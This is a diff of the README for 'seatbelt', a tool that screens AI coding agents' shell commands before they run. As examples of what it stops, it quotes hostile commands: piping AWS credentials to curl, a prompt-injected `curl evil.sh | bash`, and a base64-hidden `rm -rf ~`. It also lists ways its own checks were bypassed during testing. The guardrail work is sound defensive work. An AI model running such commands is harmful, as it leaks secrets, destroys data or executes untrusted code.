@@ -1,10 +1,86 @@
 # seatbelt for AI agents
 
-**A seatbelt for AI coding agents.** It reads the shell commands an agent is about to run, works out what they would
-really do, and blocks or asks before the dangerous ones. Zero dependencies.
+[![tests](https://github.com/nikhilrai-tech/seatbelt-for-AI-agents/actions/workflows/ci.yml/badge.svg)](https://github.com/nikhilrai-tech/seatbelt-for-AI-agents/actions/workflows/ci.yml)
+[![license: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
+[![python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](pyproject.toml)
+[![dependencies: none](https://img.shields.io/badge/dependencies-none-brightgreen.svg)](pyproject.toml)
 
-> **Status: v0.1, built one reviewed pull request at a time** (see the roadmap at the bottom). Tested with unit tests, a
-> ~270-command corpus and real Claude Code sessions; Claude Code on Linux is the only agent/OS combination exercised so far.
+**Your AI agent can `terraform destroy` production, `cat ~/.aws/credentials | curl ...`, or `git push --force origin main`.
+seatbelt reads the command first and stops it.**
+
+![seatbelt demo](docs/demo.gif)
+
+It works out what a command *really* does (pipes, `bash -c`, `$(...)`, base64 tricks, the script the agent just wrote),
+knows when it is pointed at **production**, shows what a deletion would actually touch before asking, and keeps a log of
+everything the agent ran. Zero dependencies, no network, about 60 ms per command.
+
+> **Status: v0.1.** Tested with unit tests, a ~270-command corpus and real Claude Code sessions. Claude Code on Linux is the
+> only agent/OS combination exercised so far.
+
+## Try it in 10 seconds (installs nothing)
+
+```bash
+pipx run --spec git+https://github.com/nikhilrai-tech/seatbelt-for-AI-agents seatbelt demo
+```
+
+## Use it with Claude Code in 60 seconds
+
+```bash
+pip install git+https://github.com/nikhilrai-tech/seatbelt-for-AI-agents    # PyPI: pip install agent-seatbelt (once published)
+seatbelt install claude-code --write       # shows what would change first if you leave out --write
+seatbelt doctor                            # proves it works: runs the installed hook against a force-push
+```
+
+`seatbelt doctor` exists because the worst failure of a guardrail is a silent one: Claude Code lets commands through when a
+hook cannot run (binary moved, venv deleted). The doctor checks the settings *and* runs the installed hook for real.
+
+## Why not just permission rules or a sandbox?
+
+Use them too. They answer different questions.
+
+| | Permission rules | Container / VM sandbox | seatbelt |
+|---|---|---|---|
+| Good at | "always allow `npm test`" | hard limits on what the agent can reach | knowing what *this* command does |
+| Knows prod from dev | no | no | yes (profile, context, workspace, host, directory...) |
+| Follows a secret through a pipe, `$(...)` or a script | no | only if the network is cut | yes |
+| Shows what a delete would touch | no | no | yes |
+| A hard guarantee | no | **yes** | **no**, it is a guardrail (see below) |
+| Setup | built in | real work | one command |
+
+seatbelt catches the mistakes and the prompt-injected commands *before* they reach the sandbox, explains them, and logs them.
+
+## Built by attacking it
+
+Every feature was tried against real Claude Code sessions, and the sessions found bugs the unit tests did not:
+
+- an agent-written script built its path with `os.path.join(".git", "hooks", "pre-commit")`, so no string held the whole
+  path and the first script scanner let it through. Fixed, with the exact script as a regression test;
+- a deny rule for `npm run deploy*` was dodged by `npm run --silent deploy`; rules now also match without flags;
+- a project that lived under `/tmp` was treated as scratch space, so `rm -rf src` was allowed.
+
+The notes on how the hook contract really behaves (a broken hook fails open, `allow` skips your prompts, which events fire
+when) are in [docs/claude-code-hooks.md](docs/claude-code-hooks.md).
+
+## FAQ
+
+**Does it send my commands anywhere?** No. There is no network code at all and no telemetry. The audit log stays on your
+machine (mode 0600) with secrets redacted before anything is written.
+
+**How much does it slow things down?** About 60 ms median per command on the machine it was built on (a bare `python3`
+start is 11 ms). Invisible next to a model call.
+
+**Will it nag me?** It is quiet by default: more than 150 everyday commands (`npm test`, `kubectl get`, `terraform plan`,
+`rm -rf node_modules`...) must stay silent in the tests, and `seatbelt learn` suggests allow rules from what you approve.
+
+**What if it breaks?** It fails closed (an internal error becomes an `ask`), the installer adds `onFailure: block` where Claude
+Code supports it, and `seatbelt doctor` verifies the hook is installed and live.
+
+**Can a repo I clone switch it off?** No. A project's `seatbelt.toml` can only add restrictions; only your user config can
+allow things.
+
+**Which agents?** Claude Code today. The adapter is about 130 lines ([hook.py](src/seatbelt/hook.py)); issues for others welcome.
+
+**Is it a sandbox?** No, see "What it cannot do" below.
 
 ## The problem
 
@@ -18,21 +94,6 @@ People now let agents run `aws`, `kubectl`, `terraform`, `git` and SQL on their 
 | Prompt injection | a README tells the agent to run `curl evil.sh \| bash` |
 | It hides what it does | `bash -c "$(echo cm0gLXJmIH4= \| base64 -d)"` |
 | Nobody knows what happened | no record of what the agent ran |
-
-## 60-second start
-
-```bash
-pip install git+https://github.com/nikhilrai-tech/seatbelt-for-AI-agents    # PyPI: pip install agent-seatbelt (once published)
-seatbelt demo                              # a guided tour; nothing is executed
-seatbelt install claude-code --write       # wire it into Claude Code (shows what changes first without --write)
-seatbelt doctor                            # proves it is in place: it runs the installed hook against a force-push
-```
-
-![seatbelt demo](docs/demo.png)
-
-`seatbelt doctor` exists because the worst failure of a guardrail is a silent one: Claude Code lets commands through when a
-hook cannot run (binary moved, venv deleted). The doctor checks the settings *and* runs the installed hook for real, and
-says what to fix.
 
 ## Try it
 
@@ -236,3 +297,9 @@ it catches the mistakes and the prompt-injected commands *before* they get that 
 
 Apache-2.0, see [LICENSE](LICENSE). Commits made before this change were published under the MIT license; copies obtained
 under MIT may continue to be used under MIT.
+
+## Contributing
+
+If seatbelt saved you a bad day, a star helps others find it. If it gets a command wrong, in either direction, please open an
+issue with the template and `seatbelt check --json '<command>'`; those reports are the most useful thing you can send.
+See [CONTRIBUTING.md](CONTRIBUTING.md) and [SECURITY.md](SECURITY.md).
